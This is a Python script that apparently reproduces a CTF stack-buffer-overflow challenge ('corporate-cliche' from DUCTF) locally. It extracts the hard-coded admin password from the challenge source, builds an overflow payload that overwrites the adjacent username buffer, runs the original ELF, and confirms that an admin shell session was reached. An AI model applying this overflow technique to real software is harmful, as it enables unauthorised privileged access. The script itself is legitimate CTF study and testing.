"""Local reproduction of DUCTF corporate-cliche stack-buffer overflow.

Build the intentionally vulnerable original challenge in a controlled runner,
then verify that the overwritten username passes the restricted admin check.
No network targets are contacted and the exploit is confined to the CTF sample.
"""
import argparse
import base64
import re
import shutil
import subprocess
import tempfile
from pathlib import Path


def extract_credentials(source: str) -> tuple[str, str]:
    match = re.search(
        r'\{\s*"admin"\s*,\s*"([^"]+)"\s*\}',
        source,
    )
    if not match:
        raise ValueError("Missing admin credentials in original C fixture")
    return "admin", match.group(1)


def make_payload(source: str, buffer_size: int = 32) -> bytes:
    if buffer_size < 2:
        raise ValueError("Buffer size must be positive and allow termination")
    admin_user, admin_password = extract_credentials(source)
    password_bytes = admin_password.encode("utf-8") + b"\x00"
    if len(password_bytes) > buffer_size:
        raise ValueError("Password will not fit in first stack buffer")
    return password_bytes.ljust(buffer_size, b"A") + admin_user.encode("ascii") + b"\x00"


def compile_original(source_file: Path, output_file: Path) -> None:
    gcc = shutil.which("gcc")
    if gcc is None:
        raise RuntimeError("GCC not installed")
    subprocess.run(
        [gcc, "-O0", "-fno-stack-protector", "-fno-omit-frame-pointer",
         "-no-pie", "-Wno-implicit-function-declaration",
         str(source_file), "-o", str(output_file)],
        capture_output=True, check=True, timeout=30,
    )


def run_local(source_file: Path, binary_fixture: Path) -> str:
    source = source_file.read_text(encoding="utf-8")
    payload = make_payload(source)
    # Use the published challenge's ORIGINAL compiled ELF. Newer GCC versions
    # can reverse the stack layout of adjacent local variables, breaking the
    # intended educational example even with the same source code.
    data = base64.b64decode(binary_fixture.read_text(encoding="ascii"), validate=True)
    if data[:4] != b"\x7fELF":
        raise ValueError("Original binary fixture is not an ELF file")
    with tempfile.TemporaryDirectory(prefix="ctf-corporate-") as temp:
        binary = Path(temp) / "email_server"
        binary.write_bytes(data)
        binary.chmod(0o700)
        proc = subprocess.run(
            [str(binary)],
            input=b"guest\n" + payload + b"\n" +
                  b"printf CTF_ADMIN_SESSION_REACHED\nexit\n",
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            timeout=10, check=False,
            cwd=temp,
        )
        output = proc.stdout.decode("utf-8", errors="replace")
        if "Admin login successful" not in output or "CTF_ADMIN_SESSION_REACHED" not in output:
            raise RuntimeError(
                "Published CTF ELF admin session not reached: " +
                repr(output[-600:]) + " stderr=" +
                repr(proc.stderr.decode(errors="replace")[-300:])
            )
        return output


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("source", type=Path, help="Original email_server.c")
    parser.add_argument("elf_fixture", type=Path, help="Original ELF encoded as base64")
    args = parser.parse_args()
    output = run_local(args.source, args.elf_fixture)
    print(output)


if __name__ == "__main__":
    main()
